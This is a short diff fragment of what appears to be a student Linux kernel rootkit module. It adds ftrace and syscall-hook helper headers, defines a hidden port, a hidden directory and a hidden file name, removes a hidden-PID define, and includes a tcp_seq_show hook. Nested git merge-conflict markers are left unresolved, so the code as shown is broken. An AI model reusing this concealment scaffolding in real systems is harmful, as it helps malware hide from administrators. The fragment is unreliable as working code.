@@ -19,14 +19,19 @@
 #include <linux/fdtable.h>
 #include <linux/limits.h>
 
+#include "ftrace_utils.h"
+#include "syshook_utils.h"
+
 #define HIDDEN_PORT 8080
 #define HIDDEN_FILE_DIR "/home/student/projects/hw"
 #define HIDDEN_FILE_NAME "myfile"
-#define HIDDEN_PID "4038"
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 #include "ftrace_utils.c"
 #include "syshook_utils.c"
+=======
+>>>>>>> e47ee1d... added header files to hook utils
 #include "hook_functions/tcp_seq_show.c"
 =======
 >>>>>>> 5539df4... fixup! added hide file by path feature
